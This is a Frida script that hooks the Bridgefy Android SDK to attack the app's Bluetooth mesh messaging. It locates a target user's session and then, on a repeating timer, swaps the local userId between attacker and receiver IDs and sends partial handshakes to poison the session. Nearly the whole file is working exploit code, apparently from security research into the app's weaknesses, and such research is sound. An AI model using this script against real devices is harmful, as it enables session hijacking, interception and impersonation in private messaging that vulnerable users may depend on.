const PATH_LIST = 'java.util.List';
const PATH_BRIDGEFY = 'com.bridgefy.sdk.client.Bridgefy';
const PATH_SESSION = 'com.bridgefy.sdk.framework.controller.Session';
const PATH_SESSIONMANAGER = 'com.bridgefy.sdk.framework.controller.SessionManager';

const DELAY = 223;

let attackerUserId;
let receiverUserId;
let senderUserId;
let senderUsername;

let isNormalUserId = true;

// Change the local userId.
function changeUserId(bridgefyClient, userId) {
		bridgefyClient.a.value = userId;
		send('[*] Changed local userId to: ' + bridgefyClient.getUserUuid());
}

// Send the first part of the handshake to the targeted session.
function sendHandshake1(targetSession) {
		send('[+] Sending partial handshake to poison the session...');
		targetSession.a(targetSession);
}

// Switch the userId and send a partial handshake.
function raceLooper(bridgefyClient, targetSession) {
	let userId = isNormalUserId ? receiverUserId : attackerUserId;
	changeUserId(bridgefyClient, userId);
	isNormalUserId = !isNormalUserId;
	sendHandshake1(targetSession);
}

function findSession() {
	const sessions = Java.cast(Java.use(PATH_SESSIONMANAGER).getSessions(), Java.use(PATH_LIST));
	let targetSession = null;

	for (let i = 0; i < sessions.size(); i++) {
		const session = Java.cast(sessions.get(i), Java.use(PATH_SESSION));

		let userId = session.getUserId();
		let username = session.getDevice().getDeviceName();
		let bleAddress = session.getDevice().getDeviceAddress();

		send(`[+] Session('userId=${userId}, username=${username}, bleAddress=${bleAddress})`);

		if (username != senderUsername && userId != senderUserId)
			continue;

		targetSession = session;
	}

	return targetSession;
}

function run() {
	send('[*] Finding session to attack...');
	const targetSession = findSession();

	if (targetSession == null) {
		send('[*] No session found. Exiting...');
		return;
	}

	let bridgefyClient = Java.use(PATH_BRIDGEFY).getInstance().getBridgefyClient();

	setInterval(raceLooper, DELAY, bridgefyClient, targetSession);
}

recv('params', function onMessage(post) {
	attackerUserId = post.attackerUserId;
	receiverUserId = post.receiverUserId;
	senderUserId = post.senderUserId;
	senderUsername = post.senderUsername;

	setImmediate(function() { Java.perform(run) });
});
